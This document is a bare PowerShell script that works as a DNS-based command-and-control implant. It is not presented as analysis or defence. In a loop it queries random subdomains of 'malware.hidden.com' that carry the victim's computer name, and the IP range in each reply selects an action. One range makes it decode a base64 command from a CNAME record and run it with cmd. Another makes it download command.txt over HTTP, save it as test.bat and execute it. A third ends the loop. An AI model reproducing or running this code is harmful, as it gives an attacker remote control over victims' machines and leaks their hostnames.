
while ($true)
{
$init = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
$url = $init + ".y." + $env:computername + ".malware.hidden.com"
$ip = Resolve-DNSName $url A

If ($ip.IPAddress -like "127.*") {	# normal. NOP
	sleep 10 }

ElseIf ($ip.IPAddress -like "128.*") {	# Execute cname
	$init = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
	$url = $init + ".cname." + $env:computername + ".malware.hidden.com"
	$ip2 = Resolve-DNSName $url CNAME
	cmd /c $([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($ip2.NameHost)))
	sleep 15
	}

ElseIf ($ip.IPAddress -like "129.*") { # fetch and execute
	$init = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
	$url = "http://" + $init + ".exec." + $env:computername + ".malware.hidden.com:8080/command.txt"
	$output = "test.bat"
	Invoke-WebRequest -Uri $url -OutFile $output
	cmd /c $output
	sleep 15
	}

ElseIf ($ip.IPAddress -like "130.*") { # Exit
	break
	}

sleep 5
}